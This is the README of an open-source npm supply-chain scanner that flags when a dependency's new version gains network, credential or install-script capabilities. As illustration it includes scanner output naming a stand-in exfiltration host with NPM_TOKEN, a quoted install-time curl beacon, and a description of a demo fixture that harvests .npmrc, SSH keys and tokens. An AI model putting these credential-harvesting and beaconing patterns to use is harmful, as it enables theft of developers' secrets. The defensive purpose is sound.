# capsurface

[![ci](https://github.com/VictorMartins3/capsurface/actions/workflows/ci.yml/badge.svg)](https://github.com/VictorMartins3/capsurface/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/capsurface.svg)](https://www.npmjs.com/package/capsurface)
[![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

A capability-aware supply-chain scanner for npm packages. It statically
computes each dependency's capability surface (filesystem access, network
access, process execution, environment/credential access, dynamic code
execution, install-time lifecycle scripts) and flags escalation across
versions in CI, before a compromised release gets merged.

## Quick start

No dependencies, no build step.

```bash
npx capsurface scan-tree node_modules --out .capsurface/manifests
```

```
Scanned 666 package install(s), including nested, symlinked and pnpm-store locations.

Runs code at install time: 5 of 666
  esbuild@0.28.2  risk=15
      postinstall: node install.js
  sharp@0.33.5  risk=10
      install: node install/check
  bcrypt@5.1.1  risk=4
      install: node-pre-gyp install --fallback-to-build
  ...
```

Approve that surface once, commit it, and let CI fail when it grows:

```bash
npx capsurface baseline .capsurface/manifests --out capsurface.lock.json
git add capsurface.lock.json

# in CI, after npm ci
npx capsurface scan-tree node_modules --out .capsurface/manifests
npx capsurface check .capsurface/manifests --baseline capsurface.lock.json
```

When a dependency gains something it did not have, the check says what and
exits non-zero:

```
CAPABILITY ESCALATIONS (1):

  dotenv: 16.6.1 -> 16.6.99  [dotenv]  (risk delta +22)
    [capability-added] "Network access" was not present in 16.6.1 but appears in 16.6.99.
    [capability-added] "Sensitive credential/file targeting" was not present in 16.6.1 but appears in 16.6.99.
    [lifecycle-script-changed] script changed:
    previously approved: (none)
    now:                 "node ./lib/telemetry.js"
    [new-network-endpoints] new literal endpoint(s) referenced: https://telemetry-collector.example-exfil.net/v1/ingest
    new host(s): telemetry-collector.example-exfil.net
    [new-env-vars] new credential-shaped env var(s) referenced: NPM_TOKEN
    ⚠ NEW FLAG: CRITICAL: install-time lifecycle script (preinstall/install/postinstall) combined with
      network access and credential/env access, matching the self-propagating supply-chain worm pattern.
```

## Why

Supply-chain worms self-propagate across npm by the same pattern: a
trusted package gets a routine-looking point release that quietly adds a
postinstall script, network access, and credential harvesting, sometimes
with valid provenance attached. Provenance proves who published a package.
It says nothing about what new things the package can now do. A
capability-surface diff catches the second thing directly, on top of the
tooling developers already have (npm, package.json, JS source), with no
new language or runtime required.

## What npm 12 does not close

In August 2026 npm 12 began blocking install scripts by default, and pnpm
11, Yarn 4.14, Bun and Deno now do the same. You opt packages back in
through an allowlist (`allowScripts` in package.json, `allowBuilds` in
pnpm-workspace.yaml), and `npm ci --strict-allow-scripts` fails CI when a
new transitive dependency wants to run one.

That closed the vector most of this tooling was built for, and it means the
install-script question is largely answered by the package managers plus
[npm-script-lens](https://www.npmjs.com/package/npm-script-lens), which
statically analyses each pending install script so you can decide whether
to approve it. It is good, it parses with acorn rather than regexes, it
writes the native allowlist format for all four package managers, and it
has a `--diff` mode for capabilities gained across upgrades. If your
question is "which install scripts should I approve", use that.

capsurface does both halves of that. `capsurface allowlist` writes the list
for npm, pnpm and JSON consumers, with what each package reaches for
attached so the approval is an informed one rather than a rubber stamp.

The more interesting half is what is left after that door closes. The Semgrep writeup
of the npm 12 change puts it plainly: typosquatting, dependency confusion
and "plain old malicious runtime code" all survive it. Malicious runtime
code is not hypothetical, it is what the event-stream compromise actually
was: the payload lived in flatmap-stream's published files and ran when the
library was used, with no lifecycle script involved.

Verified rather than asserted. Given a package whose 3.1.0 is clean and
whose 3.1.1 reads `~/.npmrc` and `NPM_TOKEN` and POSTs them out on first
`require()`, with no install script anywhere:

| | result |
|---|---|
| npm-script-lens 1.16.0 | "1 with no risky install-time behavior", nothing to review |
| capsurface | exit 1, names the endpoint and `NPM_TOKEN`, HIGH exfiltration flag |

Neither is wrong. A tool scoped to install scripts should report nothing
when there is no install script. That scope is the difference: capsurface
diffs the capability surface of every file a package ships, so it sees a
payload that only runs at require time. `test/` and `docs/` are included on
purpose, since that is exactly where flatmap-stream hid.

## Install

No dependencies, no build step, just Node.js >= 14.

```bash
chmod +x bin/capsurface.js
./bin/capsurface.js --help
```

Run the test suite (needs Node >= 18 for the built-in `node:test` runner;
this is dev-only, the shipped CLI still needs only Node >= 14):

```bash
npm test
```

## Usage

Scan a single package:

```bash
capsurface scan node_modules/some-pkg --out manifest.json
```

Scan an entire `node_modules` tree:

```bash
capsurface scan-tree node_modules --out .capsurface/manifests
```

Prints a risk-ranked summary and writes one manifest per installed
package, including scoped packages. Follows nested `node_modules`,
symlinked packages, and pnpm's `.pnpm` store, all bounded to the project
directory: a symlink resolving outside it is reported and fails the run
instead of being followed (see CHANGELOG.md). In a monorepo, scanning a
workspace member's own `node_modules` still finds sibling workspace
packages through workspace-root detection; pass `--boundary <dir>` to
override this for layouts detection does not fit.

Establish a baseline, once, after human review:

```bash
capsurface baseline .capsurface/manifests --out capsurface.lock.json
git add capsurface.lock.json
```

Gate CI on capability escalation, on every install after `npm ci`:

```bash
capsurface scan-tree node_modules --out .capsurface/manifests
capsurface check .capsurface/manifests --baseline capsurface.lock.json
```

Exits non-zero if any dependency's capability surface grew relative to the
committed baseline: new capability category, changed lifecycle script,
new network endpoint, new env var referenced. Add `--fail-on-new` to also
fail on packages not yet in the baseline, forcing an explicit
review-and-rebaseline step.

Produce the install-script allowlist npm 12 requires:

```bash
capsurface allowlist .capsurface/manifests
```

```
5 of 666 installed package(s) run code at install time.

Add to package.json:

  "allowScripts": [
    "bcrypt@5.1.1",
    "esbuild@0.25.12",
    "esbuild@0.28.2",
    "msgpackr-extract@3.0.4",
    "sharp@0.33.5"
  ]

What each one does at install time, from its own source:

  esbuild@0.28.2  (esbuild)
      postinstall node install.js
      reaches     filesystem, network, process execution, env
      talks to    https://registry.npmjs.org/..., https://nodejs.org/en/download/
      ⚠ HIGH: install-time lifecycle script combined with process execution.
```

Writing the list is the easy half and every tool in this space does it.
The half that takes judgement is deciding what belongs on it, so each entry
carries what that package's own source reaches for and where it talks to,
from the same manifests the gate uses. `--format pnpm` emits
`onlyBuiltDependencies` instead, `--format json` is machine readable and
carries the rules fingerprint, and `--names` drops the version pin.

Diff two manifests directly:

```bash
capsurface diff old-manifest.json new-manifest.json
```

## Limitations

This is static regex-based heuristic analysis, not a sound one.

- Cannot see through obfuscation, minification, or `require(computedExpr)`.
- Cannot see capabilities acquired only at runtime, such as dynamically
  fetched and `eval`'d code, beyond a generic "dynamic execution" flag.
- False-negative risk by construction. This is a triage signal for
  human/CI review, not an enforcement boundary. Pair it with runtime
  sandboxing (WASI, microVMs, egress allowlists) for actual enforcement.
- Category detection is a proxy, not ground truth. "exec" is detected via
  `require('child_process')` specifically to avoid colliding with
  unrelated APIs like `RegExp.prototype.exec()`.
- A plain `.ts` file that imports only types without writing `import type`
  still counts. `import type` and declaration files are erased because both
  are unambiguous; this case is not, and telling
  `import { SpawnOptions } from 'child_process'` from
  `import { execSync } from 'child_process'` needs type information rather
  than a naming convention. Measured at 87 of 20,039 packages, and guessing
  from casing would trade a small number of false positives for false
  negatives in the category where they cost most.
- The comment and regex-literal-aware scanner (`blankComments` in
  `lib/scanner.js`) is a hand-rolled character scanner, not a real parser.
  Regex-vs-division is ambiguous in JS without full parsing; see the doc
  comment there for what is and is not handled, and `${...}` template
  interpolation is a known blind spot.
- Yarn Berry's Plug'n'Play mode does not produce a `node_modules` directory
  at all, so it is not scannable as-is; set `nodeLinker: node-modules` in
  `.yarnrc.yml`, or use npm, pnpm, or classic Yarn. The other three layouts
  are verified against real installs, see Verification below.
- Scope is npm's install-time surface only: package.json scripts and the
  source of installed dependencies. No visibility into editor or IDE
  auto-execution hooks, which is the second vector the keyv/cacheable
  attack used and out of scope for a `node_modules` scan by design.

## Verification

See `test/` (119 tests, `npm test`) and CHANGELOG.md for what was found and
fixed while pressure-testing this against real installs instead of only
the bundled demo.

Discovery coverage, tested against a real 462 MB / 12,398-file tree
(typescript, webpack, next.js, eslint, jest, and their transitive deps):
capsurface finds 428 installed packages versus 286 from naively listing
`node_modules`'s top-level directories. The other 142 are nested, scoped,
or symlinked installs an earlier version of this tool missed. Scan time
was 6.4s / 423 MB peak RSS for that tree, about 67 packages/s, measured
before the profiling work described in CHANGELOG.md; the current figure on
a 20,039-package corpus is 161 packages/s single threaded. A 118-package
install of popular libraries scans in well under a second.

False-positive rate, same 118-package real corpus, before and after the
fixes in CHANGELOG.md:

| | CRITICAL flags | MEDIUM flags | aggregate risk score |
|---|---|---|---|
| Before | 2 (`glob`, `axios`, both false) | 14 | 326 |
| After | 0 | 7 | 148 |

None of the 118 packages are malicious, so zero CRITICAL is correct. The
two prior flags were confirmed false positives.

True-positive detection: the bundled Shai-Hulud-style escalation fixture
(`examples/run-demo.sh`) still fails the CI gate with the exact capability
diff. Regression fixtures cover a malicious `postinstall` hidden in a
nested `node_modules`, the same hidden behind a symlink, and a version
bump that adds only an obfuscated payload with no literal token for the
regex to match, three cases that previously slipped through.

### Discovery, against real installs from each package manager

The layouts differ enough to be worth checking separately rather than
against a fixture. Same dependency set where possible, each installed for
real, each compared against a walk that counts every directory holding a
package.json with a name and a version.

| | packages found | walk counts | difference |
|---|---|---|---|
| npm 11, hoisted | 666 | 716 | 50 |
| pnpm 12, symlinked `.pnpm` store | 222 | 227 | 5 |
| Yarn Berry 4.18, `nodeLinker: node-modules` | 202 | 208 | 5 |
| npm workspaces monorepo | 138 | 138 | 0 |

Every difference is the walk over-counting, not discovery missing anything:
they are `lib/cjs/package.json` type stubs, vendored copies, benchmark
directories and test fixtures like `pino/test/fixtures/transport`. None is
an installed package, and their source is still read as part of the package
that ships them.

The monorepo case is the one worth calling out. npm symlinks each workspace
member from `node_modules/@scope/name` to `../../packages/name`, which
resolves outside `node_modules` entirely. All three members are found, with
`installPath` recording where they really live.

### Against 20,039 packages sampled across the registry

Reading dependency trees tells you the population this runs on. It does not
tell you what the rules are wrong about, because a tree is mostly popular,
well-behaved packages. So the sample is stratified across the registry
itself: the dependency closure of 245 well-known seeds, a uniform random
draw from all 4,431,335 published names, scoped packages, recent publishes
from the changes feed, and packages found by searching for native and
install-script tooling. 22,696 tarballs fetched, 20,039 with source, 0 scan
errors.

Every evidence entry records the rule that produced it, so rules can be
judged by what they match at scale rather than one finding at a time.
Eleven were wrong; see CHANGELOG.md for each one and the measured effect of
fixing it. Two are worth repeating here because they are blind spots rather
than noise:

**Lifecycle script commands were never scanned.** The command runs at
install time but lives in package.json, so walking the package never
reached it. That hid `xhjxhjtestrce123`, whose `preinstall` and
`postinstall` both run `curl http://<host>/?host=...` and whose manifest
reported no network access at all, and `iso-process`, whose postinstall
inlines `require('child_process').execSync('npm i', {cwd: join('..',
'esm')})`.

**Files a package ships in `bin` were never read.** They carry no extension
because the shell runs them through their shebang, and 502 of the 4,502
packages that ship an executable, 11.2%, point `bin` at a file an
extension-based filter skips. That file is the code a consumer runs
directly. Reading it gave 26 of a 158-package sample a capability the
manifest had missed; for four of them, `turbo` included, no file had been
read at all and the reported risk score was 0.

That second one also exposed a reporting problem worth naming: "nothing was
read" and "nothing was found" produced the same empty manifest, and 12.5%
of the sample reads that way. The manifest now says which it is.

What the sample says about npm itself: 469 of 20,039 packages run something
at install time, 2.3%. 185 run a JavaScript file, 111 are node-gyp or
prebuild, 21 inline code with `node -e`, 8 only print a message, and
exactly one pipes a download into a shell. 8 are CRITICAL and 231 HIGH.

That last number moved late. The CRITICAL flag claims a package matches the
self-propagating worm pattern, and it was firing 37 times, 29 of them on
agent and MCP command-line tools that run a postinstall, talk to the network
and read their own service key. It was telling figma-image-exporter, a Figma
CLI reading FIGMA_TOKEN, that it looked like Shai-Hulud. A worm propagates
on credentials belonging to the environment it lands in, so that is what the
flag requires now; the other 29 are still reported one severity down. Being
wrong in the highest-severity output is the most expensive place to be
wrong.

Throughput on that corpus: 161 packages/s single threaded, 37.5s for all
20,039, after the profiling work in CHANGELOG.md. Every optimisation was
verified by re-scanning the corpus and checking all 20,039 manifests are
identical to the character.

### Does it survive a real dependency upgrade

The thing that kills a CI security gate is not missed detections, it is
false alarms on routine work. Tested by installing 14 popular packages at
versions roughly two years old (express, lodash, axios, chalk, commander,
dotenv, debug, semver, glob, uuid, ws, node-fetch, yargs, dayjs),
baselining them, then upgrading all of them to current (npm reported 25
added, 27 removed, 49 changed):

| | escalations on that upgrade |
|---|---|
| Before this was tuned | 16 |
| After | 0 |

All 16 were routine library evolution: build-tooling swaps in `prepare`
scripts (tshy, husky, lefthook), new support for `NO_COLOR` and `no_proxy`,
and documentation URLs in error messages counted as new network endpoints.
Zero were security relevant. A gate that fires 16 times on an ordinary
upgrade gets switched off in a week, so those classes are now reported
without failing the build, while the signals that mark an actual attack
path still fail it. The bundled worm fixture and every detection regression
test still fail the gate exactly as before.

That test is now a standing one, widened so it cannot be tuned against:
82 popular packages, each at its last release before 2024-09-01, diffed
against its current release. Two years and, for many of them, a major
version apart.

| | escalations of 82 |
|---|---|
| Before the registry-scale campaign below | 5 |
| After its false-positive fixes | 3 |
| After its `node:` fix | 6 |

The two that went away were both the gate misreading generated code:
`zod` 3 to 4 on a long IPv6 regex literal, `vite` 5 to 8 on the string
`".npmrc"` inside a bundled list of config filenames.

Then the number went up, because the scanner started seeing things it had
been blind to. `nanoid` 6 added a CLI that reads files with
`import { readFileSync } from 'node:fs'` and `vitest` spawns processes with
`node:child_process`; neither was visible before. A capability a dependency
did not have two years ago is what this is supposed to raise once.

Teams upgrade one release at a time, so that is measured too: every fifth
release of the same packages since 2024, diffed against the one before it.
396 upgrades, 19 escalations, 4.8%. One in twenty asks for a glance, and
they are worth it, `prettier` 3.7 really did add a `fetch` call to its
experimental CLI.

### On a realistic production tree

A 215-package service (express, pg, ioredis, jsonwebtoken, bcrypt, pino,
helmet, zod, prom-client, the AWS S3 SDK, stripe) scans in 1.6s and reports
this first:

```
Runs code at install time: 1 of 215
  bcrypt@5.1.1  risk=4
      install: node-pre-gyp install --fallback-to-build
```

That is the entire install-time execution surface of the tree, which is the
number that decides blast radius. It is also why the install-time list
prints before the risk ranking: bcrypt scores 4, because its own source
touches nothing else, and sorted below twenty higher-scoring packages that
cannot execute during install at all.

### Benchmark against GuardDog

Same 119-package corpus and the same bundled fixture, run locally with
GuardDog's dynamic sandbox and registry-metadata rules disabled (no kernel
sandbox available in this environment, and the fixture was never
published so it has no registry metadata).

Speed: `capsurface scan-tree` scans the full corpus in 0.95s (median of 3
runs). GuardDog has no bulk/tree mode, so checking the same corpus is one
process per package: 45.4s for 119 packages, about 47x slower, mostly
Python and rule-engine startup cost paid per package.

False-positive rate: parity. GuardDog rated 116/119 packages
`no_risks_detected` and the rest `low`, matching capsurface's zero
CRITICAL on the same corpus.

Detection of the bundled fixture is the interesting result. GuardDog
correctly detected every individual signal, the `.ssh/id_rsa` and
`.npmrc` reads, the `NPM_TOKEN`/`GITHUB_TOKEN` env reads, the HTTPS
beacon, but its aggregate `risk_score` labeled the fixture `low` (4.9/10),
discounting it as unsophisticated. Reading its rule source explains why:
`threat-npm-preinstall-script.yar` matches only the literal string
`"preinstall"`, never `"postinstall"` or `"install"`, so it never fires on
this fixture. Its broader `threat-process-hooks` rule covers postinstall
but only fires when a raw shell command is inlined directly in
package.json. The common real-world shape, `"postinstall": "node
./scripts/setup.js"` with the payload one file away, is not covered by
either rule. `postinstall` is not a hypothetical here: it is what the
original Shai-Hulud campaign used and one of two vectors the keyv/cacheable
worm used. This is a fair result under the specific conditions tested, not
a claim that GuardDog is weak in general; its full configuration (dynamic
sandbox, registry metadata, a broader rule set than capsurface's six
categories) was not evaluated. It does show that capsurface's uniform
treatment of `preinstall`/`install`/`postinstall` as equally
install-triggering closes a gap that a more general tool's rule set, as
configured and run here, did not.

## Prior art

Where capsurface sits among the tools that already exist.

| | Detection basis | Timing model | Deployment |
|---|---|---|---|
| Socket | Behavioral analysis, real-time registry-wide monitoring, threat intel | Proactive, ecosystem-wide, can flag a compromised publish within minutes | Hosted SaaS (free tier for OSS) |
| Semgrep Supply Chain (malicious-dependency feature) | Lookup against a database of 80,000+ known-malicious packages | Reactive, needs the package already discovered and added to the database | Hosted SaaS |
| GuardDog (Datadog, open source) | Static heuristics (YARA rules as of v3.2.0, Semgrep in earlier releases) correlating a capability with a threat indicator, plus an optional dynamic sandbox and registry-metadata rules | Proactive, point-in-time: `guarddog npm scan <pkg>@<version>` scores one version in isolation, no bulk/tree mode | Open source CLI, local |
| capsurface | Static heuristics correlating capability categories | Proactive and delta-based: fires only when a capability is new relative to a reviewed baseline | Open source, zero dependencies, offline |

Two things are already solved better elsewhere, and capsurface does not
compete on either. Socket's real-time monitoring and Semgrep's
malicious-package database do things a static, offline, zero-dependency
tool cannot: catch a compromised publish before `npm install` ever runs,
correlate against maintainer behavior and typosquatting, and cover more
ecosystems than the six categories here. Static analysis is also weaker
than dynamic sandboxed analysis for obfuscated payloads, which is why the
OpenSSF's own [Package Analysis](https://github.com/ossf/package-analysis)
project runs packages in gVisor instead of only reading source. GuardDog
and Semgrep share this limitation for their source-only heuristics too.

What capsurface bets on instead is the timing model. GuardDog and most
point-in-time scanners answer "is this version risky in isolation," so a
package that legitimately has network and env access, which is most
packages, re-triggers the same warning on every scan forever unless the
tool keeps its own allowlist. capsurface answers "did this update add a
capability that was not in the version we already reviewed," the same
question `git diff` answers for code, applied to capability surface. The
unit of trust is a plain JSON file committed next to `package-lock.json`
and reviewed in PRs, not a hosted API or a score you cannot inspect. It is
not a replacement for Socket or Semgrep. It is a cheap first gate that
does not require a SaaS relationship to exist at all.

On August 4 2026, the `keyv`/`cacheable` npm namespaces (2,234 poisoned
versions across 444 packages) were compromised through a hijacked
maintainer account. The payload was a `preinstall` hook that downloaded a
standalone Bun runtime and ran an obfuscated second-stage payload
harvesting credentials, [reported by Socket, Wiz, Datadog, and
Snyk](https://socket.dev/blog/popular-npm-packages-in-the-keyv-and-cacheable-namespaces-compromised-in-active-supply-chain).
capsurface cannot see what the downloaded runtime does, same blind spot as
below, but does not need to: a `preinstall` script combined with new
network access is exactly the CRITICAL combination this tool flags, on the
first scan of the compromised version, using only what is already
implemented. It is also a second real-world confirmation, after Shai-Hulud
V1 to V2, that `preinstall` and not just `postinstall` is where these
attacks land (see CHANGELOG.md). The same report describes a vector this
tool has no coverage for: malicious VS Code and Claude Code hook files
committed straight into the source tree, executing on folder-open with no
`npm install` involved. Noted below as a real limitation, not ignored.

## Example

`examples/malicious-pkg-v1` and `examples/malicious-pkg-v2` model a
believable benign package (`handy-color-utils`) compromised in a
routine-looking patch release. v2 adds a `postinstall` script that reads
`~/.npmrc`, `~/.ssh/id_rsa`, `NPM_TOKEN`, and `GITHUB_TOKEN`, beacons them
to a remote host, and attempts to self-publish with the harvested token,
modeled on the publicly reported Shai-Hulud npm worm family.

Run `examples/run-demo.sh` to see capsurface baseline v1, scan v2, and
fail the CI check with the exact capability diff.

## Design notes

- No dependencies. Zero install friction, the point of building this fast
  and cheap first.
- JSON in, JSON out. Manifests and the lock file diff cleanly in PRs and
  feed easily into other tooling.
- The baseline is keyed by package name, not pinned to a single version.
  A name can hold more than one approved manifest for packages installed
  at multiple versions in the same tree.
- Discovery follows real package-manager layouts, not a flat top-level
  listing: nested `node_modules`, symlinks, and pnpm's `.pnpm` store are
  all walked, deduplicated by realpath, and cycle-safe. See
  `test/discovery.test.js` and CHANGELOG.md.

## Contributing

Start with [ARCHITECTURE.md](ARCHITECTURE.md) for how the pieces fit and
where to change what, then [CONTRIBUTING.md](CONTRIBUTING.md). A rule change
is measured against real packages, not argued; the pull request template
asks for the numbers.

Security issues go through [SECURITY.md](SECURITY.md), not a public issue.
Conduct: [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md).

## License

MIT, see [LICENSE](LICENSE).
